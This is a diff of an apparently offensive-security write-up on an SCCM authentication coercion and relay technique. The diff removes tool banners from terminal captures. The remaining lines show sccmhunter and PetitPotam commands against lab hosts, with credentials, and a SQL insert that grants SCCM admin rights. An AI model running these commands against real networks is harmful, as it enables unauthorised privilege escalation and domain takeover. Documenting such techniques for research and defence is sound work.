@@ -49,19 +49,7 @@ This technique may allow an attacker to coerce and relay authentication from a p
 
 ```
 ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/sccmhunter]
-└─# python3 sccmhunter.py mssql -u administrator -p P@ssw0rd -d internal.lab -dc-ip 10.10.100.100 -tu specter -sc LAB
-
-                                                                                          (
-                                    888                         d8                         \
- dP"Y  e88'888  e88'888 888 888 8e  888 ee  8888 8888 888 8e   d88    ,e e,  888,8,        )
-C88b  d888  '8 d888  '8 888 888 88b 888 88b 8888 8888 888 88b d88888 d88 88b 888 "    ##-------->
- Y88D Y888   , Y888   , 888 888 888 888 888 Y888 888P 888 888  888   888   , 888           )
-d,dP   "88,e8'  "88,e8' 888 888 888 888 888  "88 88"  888 888  888    "YeeP" 888          /
-                                                                                         (
-                                                                 v0.0.2                   
-                                                                 @garrfoster                    
-    
-    
+└─# python3 sccmhunter.py mssql -u administrator -p P@ssw0rd -d internal.lab -dc-ip 10.10.100.100 -tu specter -sc LAB  
     
 [04:20:44 PM] INFO     [*] Resolving specter SID...                                                                                              
 [04:20:44 PM] INFO     [*] Converted specter SID to 0x010500000000000515000000010A878E28A377F8F541F39A6D040000                                   
@@ -75,21 +63,6 @@ USE CM_LAB; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,Create
 ```
 ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
 └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd 10.10.100.136 passive.internal.lab
-
-                                                                                               
-              ___            _        _      _        ___            _                     
-             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
-             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
-            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
-          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
-          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
-                                         
-              PoC to elicit machine account authentication via some MS-EFSRPC functions
-                                      by topotam (@topotam77)
-      
-                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
-
-
 
 Trying pipe lsarpc
 [-] Connecting to ncacn_np:passive.internal.lab[\PIPE\lsarpc]
